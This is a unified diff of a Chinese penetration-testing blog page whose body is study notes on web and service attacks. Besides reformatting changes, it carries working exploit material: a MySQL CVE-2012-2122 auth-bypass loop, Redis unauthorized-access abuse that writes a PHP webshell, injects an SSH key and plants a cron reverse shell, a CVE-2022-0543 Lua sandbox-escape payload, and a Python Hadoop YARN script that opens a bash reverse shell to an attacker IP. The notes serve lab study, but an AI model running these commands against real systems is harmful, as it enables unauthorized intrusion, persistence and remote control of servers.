@@ -16,12 +16,12 @@
   <meta name="author" content="D4wn">
   <meta name="keywords" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
   
-    <meta name="description" content="渗透一、基础入门二、信息打点三、PHP开发四、WEB攻防前置知识 同源策略(SOP)包括三个条件  同协议 通端口 同域名  同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略 但是限制的一些前端功能的实现 所以就有了许多跨域的手段 前端的访问后端 若出现跨域问题 是前端的问题  子域名接管-检测&amp;探针&amp;利用 通过检测CNAME获取指向 若发">
+    <meta name="description" content="渗透 一、基础入门 二、信息打点 三、PHP开发 四、WEB攻防 前置知识  同源策略(SOP)包括三个条件  同协议 通端口 同域名  同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略 但是限制的一些前端功能的实现 所以就有了许多跨域的手段 前端的访问后端 若出现跨域问题 是前端的问题  子域名接管-检测&amp;探针">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透">
 <meta property="og:url" content="https://d4wnnn.github.io/2023/05/19/%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="渗透一、基础入门二、信息打点三、PHP开发四、WEB攻防前置知识 同源策略(SOP)包括三个条件  同协议 通端口 同域名  同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略 但是限制的一些前端功能的实现 所以就有了许多跨域的手段 前端的访问后端 若出现跨域问题 是前端的问题  子域名接管-检测&amp;探针&amp;利用 通过检测CNAME获取指向 若发">
+<meta property="og:description" content="渗透 一、基础入门 二、信息打点 三、PHP开发 四、WEB攻防 前置知识  同源策略(SOP)包括三个条件  同协议 通端口 同域名  同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略 但是限制的一些前端功能的实现 所以就有了许多跨域的手段 前端的访问后端 若出现跨域问题 是前端的问题  子域名接管-检测&amp;探针">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://source.unsplash.com/user/erondu/1600x900">
 <meta property="article:published_time" content="2023-05-19T03:25:17.000Z">
@@ -376,7 +376,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.5k 字
+          4.6k 字
         
       </span>
     
@@ -387,7 +387,7 @@ mjx-container[display="true"] + br {
         
         
         
-          38 分钟
+          39 分钟
         
       </span>
     
@@ -430,144 +430,184 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="一、基础入门"><a href="#一、基础入门" class="headerlink" title="一、基础入门"></a>一、基础入门</h2><h2 id="二、信息打点"><a href="#二、信息打点" class="headerlink" title="二、信息打点"></a>二、信息打点</h2><h2 id="三、PHP开发"><a href="#三、PHP开发" class="headerlink" title="三、PHP开发"></a>三、PHP开发</h2><h2 id="四、WEB攻防"><a href="#四、WEB攻防" class="headerlink" title="四、WEB攻防"></a>四、WEB攻防</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><blockquote>
+                <h1 id="渗透">渗透</h1>
+<h2 id="一基础入门">一、基础入门</h2>
+<h2 id="二信息打点">二、信息打点</h2>
+<h2 id="三php开发">三、PHP开发</h2>
+<h2 id="四web攻防">四、WEB攻防</h2>
+<h3 id="前置知识">前置知识</h3>
+<blockquote>
 <p>同源策略(SOP)包括三个条件</p>
-<ol>
+<ol type="1">
 <li>同协议</li>
 <li>通端口</li>
 <li>同域名</li>
 </ol>
-<p>同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互 是浏览器的一种安全策略</p>
+<p>同源策略限制从一个源加载的文档或者脚本与来自另一个源的资源进行交互
+是浏览器的一种安全策略</p>
 <p>但是限制的一些前端功能的实现 所以就有了许多跨域的手段</p>
 <p>前端的访问后端 若出现跨域问题 是前端的问题</p>
 </blockquote>
-<h3 id="子域名接管-检测-amp-探针-amp-利用"><a href="#子域名接管-检测-amp-探针-amp-利用" class="headerlink" title="子域名接管-检测&探针&利用"></a>子域名接管-检测&amp;探针&amp;利用</h3><blockquote>
+<h3 id="子域名接管-检测探针利用">子域名接管-检测&amp;探针&amp;利用</h3>
+<blockquote>
 <p>通过检测CNAME获取指向 若发现过期域名 可以注册实现劫持</p>
 <p>子域名接管不仅仅限于CNAME记录</p>
 </blockquote>
-<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><blockquote>
+<h3 id="cors">CORS</h3>
+<blockquote>
 <ul>
-<li><p>Cross-Orgin Resource Sharing 跨域资源共享 允许浏览器向跨源服务器发送XMLHttpRequest请求</p>
-</li>
-<li><p>CORS支持所有形式的http请求</p>
-</li>
-<li><p>用户A登录自己的后台或者其他页面 访问了第三方页面 第三方页面请求用户A访问页面的内容 页面源码泄露</p>
-</li>
-<li><p>CORS只能获得资源 不能像CSRF达到添加用户之类的操作</p>
-</li>
-<li><p>类似CSRF 但是若有同源策略 CSRF失效</p>
-</li>
-<li><p><code>Acess-Control-Allow-Orgin：*</code>表示其他页面能获取此页面的资源</p>
-</li>
-<li><p>利用条件：用户登录且有安全问题 只能获取资源文件</p>
-</li>
+<li><p>Cross-Orgin Resource Sharing 跨域资源共享
+允许浏览器向跨源服务器发送XMLHttpRequest请求</p></li>
+<li><p>CORS支持所有形式的http请求</p></li>
+<li><p>用户A登录自己的后台或者其他页面 访问了第三方页面
+第三方页面请求用户A访问页面的内容 页面源码泄露</p></li>
+<li><p>CORS只能获得资源 不能像CSRF达到添加用户之类的操作</p></li>
+<li><p>类似CSRF 但是若有同源策略 CSRF失效</p></li>
+<li><p><code>Acess-Control-Allow-Orgin：*</code>表示其他页面能获取此页面的资源</p></li>
+<li><p>利用条件：用户登录且有安全问题 只能获取资源文件</p></li>
 </ul>
 </blockquote>
-<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><blockquote>
+<h3 id="jsonp">JSONP</h3>
+<blockquote>
 <p>JSNOP只支持get 不支持post</p>
 <p>jsonp跨域巧妙的利用了script标签能跨域的特点 实现了json的跨域传输</p>
-<p>用户A浏览器访问过虎牙 优酷 淘宝等页面 攻击者尝试去测试这些官方的回调(callback)页面</p>
+<p>用户A浏览器访问过虎牙 优酷 淘宝等页面
+攻击者尝试去测试这些官方的回调(callback)页面</p>
 </blockquote>
-<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><blockquote>
+<h3 id="工具使用">工具使用</h3>
+<blockquote>
 <ul>
 <li><p>dnsub-子域名扫描工具</p>
 <p>类似OneForAll 但是速度快</p>
-<p><code>https://github.com/yunxu1/dnsub</code></p>
-</li>
+<p><code>https://github.com/yunxu1/dnsub</code></p></li>
 <li><p>CORScanner</p>
-<p><code>https://github.com/chenjj/CORScanner</code></p>
-</li>
-</ul>
-<ul>
+<p><code>https://github.com/chenjj/CORScanner</code></p></li>
 <li><p>Corsy</p>
-<p><code>https://github.com/s0md3v/Corsy</code></p>
-</li>
+<p><code>https://github.com/s0md3v/Corsy</code></p></li>
 </ul>
 </blockquote>
-<h2 id="五、服务攻防"><a href="#五、服务攻防" class="headerlink" title="五、服务攻防"></a>五、服务攻防</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><blockquote>
+<h2 id="五服务攻防">五、服务攻防</h2>
+<h3 id="前置知识-1">前置知识</h3>
+<blockquote>
 <p>服务攻防大致流程：</p>
-<p><img src="/2023/05/19/%E6%B8%97%E9%80%8F/image.png" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>   服务开放了 扫描到的端口没开放:</p>
-<ol>
+<figure>
+<img src="/2023/05/19/%E6%B8%97%E9%80%8F/image.png" srcset="/img/loading.gif" lazyload alt="image">
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>服务开放了 扫描到的端口没开放:</p>
+<ol type="1">
 <li>端口修改了</li>
 <li>只能内网访问</li>
 <li>防护应用</li>
 </ol>
 </blockquote>
-<h3 id="5-1-数据库安全"><a href="#5-1-数据库安全" class="headerlink" title="5.1 数据库安全"></a>5.1 数据库安全</h3><h4 id="5-1-1-MySQL"><a href="#5-1-1-MySQL" class="headerlink" title="5.1.1 MySQL"></a>5.1.1 MySQL</h4><blockquote>
-<h2 id="CVE-2012-2122-身份认证绕过漏洞"><a href="#CVE-2012-2122-身份认证绕过漏洞" class="headerlink" title="CVE-2012-2122-身份认证绕过漏洞"></a>CVE-2012-2122-身份认证绕过漏洞</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`;<span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 172.30.158.168 -P 3306;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>攻击机:172.30.152.248</p>
+<h3 id="数据库安全">5.1 数据库安全</h3>
+<h4 id="mysql">5.1.1 MySQL</h4>
+<blockquote>
+<h2 id="cve-2012-2122-身份认证绕过漏洞">CVE-2012-2122-身份认证绕过漏洞</h2>
+<h3 id="exp">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`;<span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 172.30.158.168 -P 3306;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<h3 id="复现">复现</h3>
+<p>攻击机:172.30.152.248</p>
 <p>靶机:172.30.158.168</p>
-<p><img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110807493.png" srcset="/img/loading.gif" lazyload alt="image-20221003110807493"></p>
+<figure>
+<img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110807493.png" srcset="/img/loading.gif" lazyload alt="image-20221003110807493">
+<figcaption aria-hidden="true">image-20221003110807493</figcaption>
+</figure>
 </blockquote>
-<h4 id="5-1-2-Redis"><a href="#5-1-2-Redis" class="headerlink" title="5.1.2 Redis"></a>5.1.2 Redis</h4><blockquote>
-<img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;">
-
-<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><p>注：redis不区分大小写</p>
+<h4 id="redis">5.1.2 Redis</h4>
+<blockquote>
+<p><img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;"></p>
+<h2 id="常见命令">常见命令</h2>
+<p>注：redis不区分大小写</p>
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">keys * 获取数据库中所有的键<br><span class="hljs-built_in">save</span> 进行一次备份操作<br>flushall 清除所有数据<br><span class="hljs-built_in">del</span> <span class="hljs-built_in">key</span> 删除数据<br></code></pre></td></tr></table></figure>
-
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>安全模式起作用需要同时满足两个条件：</p>
+<h2 id="配置文件">配置文件</h2>
+<p>安全模式起作用需要同时满足两个条件：</p>
 <ul>
 <li>redis没有开启登录认证</li>
 <li>redis没有绑定ip</li>
 </ul>
 <p>redis默认是未开启认证，开启安全模式的</p>
-<h2 id="未授权访问应用条件"><a href="#未授权访问应用条件" class="headerlink" title="未授权访问应用条件"></a>未授权访问应用条件</h2><ol>
+<h2 id="未授权访问应用条件">未授权访问应用条件</h2>
+<ol type="1">
 <li>bind 127.0.0.1 处于注释状态</li>
 <li>protected-mode no</li>
 <li>requirepass 处于注释状态</li>
 </ol>
-<h2 id="写Webshell"><a href="#写Webshell" class="headerlink" title="写Webshell"></a>写Webshell</h2><p>应用条件：知道Web目录，并且可读写</p>
+<h2 id="写webshell">写Webshell</h2>
+<p>应用条件：知道Web目录，并且可读写</p>
 <figure class="highlight plaintext"><figcaption><span>set dir</span><a href="/tmp">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs config">config set dir /var/www/html<br>config set dbfilename 1.php<br>set test "&lt;?php phpinfo();?&gt;"<br>bgsave # 保存执行<br>save # 保存执行<br>注意:部分目录没有读写权限<br></code></pre></td></tr></table></figure>
-
-<h2 id="写入RSA秘钥"><a href="#写入RSA秘钥" class="headerlink" title="写入RSA秘钥"></a>写入RSA秘钥</h2><p>前提条件</p>
+<h2 id="写入rsa秘钥">写入RSA秘钥</h2>
+<p>前提条件</p>
 <ul>
 <li>redis以root账号启动</li>
 <li>服务器必须允许密钥登陆</li>
 <li>protected-mode处于关闭状态</li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh/<br>config set dbfilename authorized_keys<br>set x "\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdPp3/tfIlmHhVKuaR5Ckd0uuv98Q6AusZP9ZJrrb8aRWniTNCdUvV7gfW5ctZxROXfUF+tvnd6So8MwR70AwNqaCsWrsUBPzJXcR1Zl89M1G9KulUOgF3rANKQ8dqZivouvs1DcqkyqWi1652tAQ+4xS8i/mhFeS0dxjajttcrzmirF9DPzlsKTzfbMpUYupRAOl7GikdB9dhPzH3xQ4Oem4UMeZbznPuT861msmNLByh3ni+szdrF8yqwbPkVSDDbUlFCppF9N+Fykra5Uuc/tkXZaxgAjBWdpeFsLnMPlBWKoN1BJpzwZHgG2iKLT7PJS5bqx+RdkD7XJy9eqXL root@mail.test.com \n\n\n"<br>或者<br>(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt<br>cat foo.txt | redis-cli -h x.x.x.x -x set crackit<br>save<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="写定时任务反弹shell"><a href="#写定时任务反弹shell" class="headerlink" title="写定时任务反弹shell"></a>写定时任务反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron<br>config set dbfilename root #必须是root<br>set xx  "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"<br>save<br></code></pre></td></tr></table></figure>
-
-<h2 id="CVE-2022-0543-沙箱绕过"><a href="#CVE-2022-0543-沙箱绕过" class="headerlink" title="CVE-2022-0543-沙箱绕过"></a>CVE-2022-0543-沙箱绕过</h2><p>攻击机:172.30.152.248</p>
+<h2 id="写定时任务反弹shell">写定时任务反弹shell</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron<br>config set dbfilename root #必须是root<br>set xx  "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"<br>save<br></code></pre></td></tr></table></figure>
+<h2 id="cve-2022-0543-沙箱绕过">CVE-2022-0543-沙箱绕过</h2>
+<p>攻击机:172.30.152.248</p>
 <p>靶机:172.30.158.168</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.2 &lt;= redis &lt; 5.0.13<br>2.2 &lt;= redis &lt; 6.0.15<br>2.2 &lt;= redis &lt; 6.2.5</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0<br></code></pre></td></tr></table></figure>
-
-<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703"></p>
-<p><img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237"></p>
-<h2 id="RCE-主从复制getshell"><a href="#RCE-主从复制getshell" class="headerlink" title="RCE-主从复制getshell"></a>RCE-主从复制getshell</h2><p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
-<h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="影响版本">影响版本</h3>
+<p>2.2 &lt;= redis &lt; 5.0.13 2.2 &lt;= redis &lt; 6.0.15 2.2 &lt;=
+redis &lt; 6.2.5</p>
+<h3 id="exp-1">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0<br></code></pre></td></tr></table></figure>
+<h3 id="复现-1">复现</h3>
+<figure>
+<img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703">
+<figcaption aria-hidden="true">image-20221003110605703</figcaption>
+</figure>
+<figure>
+<img src="/2023/05/19/%E6%B8%97%E9%80%8F/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237">
+<figcaption aria-hidden="true">image-20221003110613237</figcaption>
+</figure>
+<h2 id="rce-主从复制getshell">RCE-主从复制getshell</h2>
+<p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
+<h3 id="漏洞成因">漏洞成因</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="先决条件">先决条件：</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
 <p>root权限启动redis</p>
 <p>自动化脚本：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>https://github.com/n0b0dyCN/redis-rogue-server</p>
 <p><code>python redis-rogue-server.py --rhost 192.168.52.251 --lhost 192.168.52.128</code></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结 - T00ls.Com</a></p>
-<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83">https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/303910.html">https://www.freebuf.com/articles/web/303910.html</a></p>
+<h2 id="参考链接">参考链接</h2>
+<p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结
+- T00ls.Com</a></p>
+<p>https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</p>
+<p>https://www.freebuf.com/articles/web/303910.html</p>
 </blockquote>
-<h3 id="5-2-Haddop"><a href="#5-2-Haddop" class="headerlink" title="5.2 Haddop"></a>5.2 Haddop</h3><blockquote>
-<p>靶场:<a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn</a></p>
+<h3 id="haddop">5.2 Haddop</h3>
+<blockquote>
+<p>靶场:https://vulfocus.cn</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># Hadoop未授权访问exp</span><br><br><span class="hljs-comment"># --------------------------设置参数-----------------------------------------------------------------------------</span><br>target = <span class="hljs-string">'http://172.30.158.168:8088/'</span>  <span class="hljs-comment"># 靶机</span><br>lhost = <span class="hljs-string">'120.53.236.54'</span>  <span class="hljs-comment"># 攻击机</span><br>port = <span class="hljs-string">'8999'</span>  <span class="hljs-comment"># 监听shell端口</span><br><span class="hljs-comment"># -------------------------------------------------------------------------------------------------------</span><br>url = target + <span class="hljs-string">'ws/v1/cluster/apps/new-application'</span><br>resp = requests.post(url)<br>app_id = resp.json()[<span class="hljs-string">'application-id'</span>]<br>url = target + <span class="hljs-string">'ws/v1/cluster/apps'</span><br>data = {<br>    <span class="hljs-string">'application-id'</span>: app_id,<br>    <span class="hljs-string">'application-name'</span>: <span class="hljs-string">'get-shell'</span>,<br>    <span class="hljs-string">'am-container-spec'</span>: {<br>        <span class="hljs-string">'commands'</span>: {<br>            <span class="hljs-string">f'command'</span>: <span class="hljs-string">f'/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">{lhost}</span>/<span class="hljs-subst">{port}</span> 0&gt;&amp;1'</span>,<br>        },<br>    },<br>    <span class="hljs-string">'application-type'</span>: <span class="hljs-string">'YARN'</span>,<br>}<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
-
 </blockquote>
-<h2 id="六、API攻防"><a href="#六、API攻防" class="headerlink" title="六、API攻防"></a>六、API攻防</h2><h2 id="七、APP攻防"><a href="#七、APP攻防" class="headerlink" title="七、APP攻防"></a>七、APP攻防</h2><h2 id="八、漏洞发现"><a href="#八、漏洞发现" class="headerlink" title="八、漏洞发现"></a>八、漏洞发现</h2><h2 id="九、漏洞利用"><a href="#九、漏洞利用" class="headerlink" title="九、漏洞利用"></a>九、漏洞利用</h2><h2 id="十、WAF攻防"><a href="#十、WAF攻防" class="headerlink" title="十、WAF攻防"></a>十、WAF攻防</h2><h2 id="十一、代码审计"><a href="#十一、代码审计" class="headerlink" title="十一、代码审计"></a>十一、代码审计</h2><h2 id="十二、权限提升"><a href="#十二、权限提升" class="headerlink" title="十二、权限提升"></a>十二、权限提升</h2><blockquote>
+<h2 id="六api攻防">六、API攻防</h2>
+<h2 id="七app攻防">七、APP攻防</h2>
+<h2 id="八漏洞发现">八、漏洞发现</h2>
+<h2 id="九漏洞利用">九、漏洞利用</h2>
+<h2 id="十waf攻防">十、WAF攻防</h2>
+<h2 id="十一代码审计">十一、代码审计</h2>
+<h2 id="十二权限提升">十二、权限提升</h2>
+<blockquote>
 <p>在Linux中</p>
 <p>管理员UID=0</p>
 <p>系统用户UID：1~999</p>
 <p>普通用户UID从1000开始</p>
 <p>第三方应用或者插件都可以作为一个权限提升的途径</p>
-<h2 id="Web权限"><a href="#Web权限" class="headerlink" title="Web权限"></a>Web权限</h2><p>以Redis为例</p>
+<h2 id="web权限">Web权限</h2>
+<p>以Redis为例</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /home/wwwroot/default # 设置web写入目录<br>config set dbfilename test.php # 设置写入文件名<br>set test "&lt;?php phpinfo(); ?&gt;" # 设置写入文件代码<br>bgsave #保存执行<br></code></pre></td></tr></table></figure>
-
 <p>java jsp类的统一是root权限</p>
-<h2 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>默认情况下，系统为用户分了7个组</p>
-<ol>
+<h2 id="系统权限">系统权限</h2>
+<h3 id="windows">Windows</h3>
+<p>默认情况下，系统为用户分了7个组</p>
+<ol type="1">
 <li>管理员组Administrators</li>
 <li>高权限用户组Power Users</li>
 <li>普通用户组Users</li>
@@ -578,25 +618,20 @@ mjx-container[display="true"] + br {
 </ol>
 <p>其中文件复制组和备份文件组为维护系统而设置，平时很少使用</p>
 <p>除了上面七个默认权限分组，系统还存在一些特殊权限成员</p>
-<ol>
-<li><p>系统System</p>
-</li>
-<li><p>信任程序模块Trustedinstaller</p>
-</li>
+<ol type="1">
+<li><p>系统System</p></li>
+<li><p>信任程序模块Trustedinstaller</p></li>
 <li><p>所有人Everyone</p>
-<p>任何人都能访问被赋予Everyone权限的文件</p>
-</li>
+<p>任何人都能访问被赋予Everyone权限的文件</p></li>
 <li><p>创建者Creator Owner</p>
 <p>被标记创建者权限的文件只有创建文件的用户才可访问</p>
-<p>但是一切文件访问权限可被System用户和管理员组成员忽略</p>
-</li>
+<p>但是一切文件访问权限可被System用户和管理员组成员忽略</p></li>
 </ol>
 <p>这些特殊成员不被任何内置用户组吸纳，完全独立</p>
 <p>常见命令</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">systeminfo 打印系统信息<br>whoami/priv 当前用户权限<br>ipconfig/displaydns 当前dns缓存<br>net user 列出用户<br>net localgroup 列出用户组<br>net user UserName 列出用户信息<br>net localgroup <span class="hljs-built_in">Group</span> 列出用户组信息<br>ver 查看系统版本<br>tasklist /svc 查看进程信息和服务信息<br></code></pre></td></tr></table></figure>
-
 <p>提权步骤</p>
-<ol>
+<ol type="1">
 <li>信息搜集 版本 漏洞补丁 杀软 位数 网络 权限</li>
 <li>基于信息筛选漏洞</li>
 </ol>
@@ -605,8 +640,16 @@ mjx-container[display="true"] + br {
 <li>数据库提权</li>
 <li>第三方软件</li>
 </ul>
-<h2 id="域控权限"><a href="#域控权限" class="headerlink" title="域控权限"></a>域控权限</h2></blockquote>
-<h2 id="十三、免杀对抗"><a href="#十三、免杀对抗" class="headerlink" title="十三、免杀对抗"></a>十三、免杀对抗</h2><h2 id="十四、内网安全"><a href="#十四、内网安全" class="headerlink" title="十四、内网安全"></a>十四、内网安全</h2><h2 id="十五、红队APT"><a href="#十五、红队APT" class="headerlink" title="十五、红队APT"></a>十五、红队APT</h2><h2 id="十六、安全开发"><a href="#十六、安全开发" class="headerlink" title="十六、安全开发"></a>十六、安全开发</h2><h2 id="十七、应急响应"><a href="#十七、应急响应" class="headerlink" title="十七、应急响应"></a>十七、应急响应</h2><h2 id="十八、溯源反制"><a href="#十八、溯源反制" class="headerlink" title="十八、溯源反制"></a>十八、溯源反制</h2><h2 id="十九、SRC挖掘"><a href="#十九、SRC挖掘" class="headerlink" title="十九、SRC挖掘"></a>十九、SRC挖掘</h2>
+<h2 id="域控权限">域控权限</h2>
+</blockquote>
+<h2 id="十三免杀对抗">十三、免杀对抗</h2>
+<h2 id="十四内网安全">十四、内网安全</h2>
+<h2 id="十五红队apt">十五、红队APT</h2>
+<h2 id="十六安全开发">十六、安全开发</h2>
+<h2 id="十七应急响应">十七、应急响应</h2>
+<h2 id="十八溯源反制">十八、溯源反制</h2>
+<h2 id="十九src挖掘">十九、SRC挖掘</h2>
+
                 
               </div>
             
@@ -694,6 +737,12 @@ mjx-container[display="true"] + br {
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/05/19/%E5%8C%BA%E5%9D%97%E9%93%BE/" title="区块链">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">区块链</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
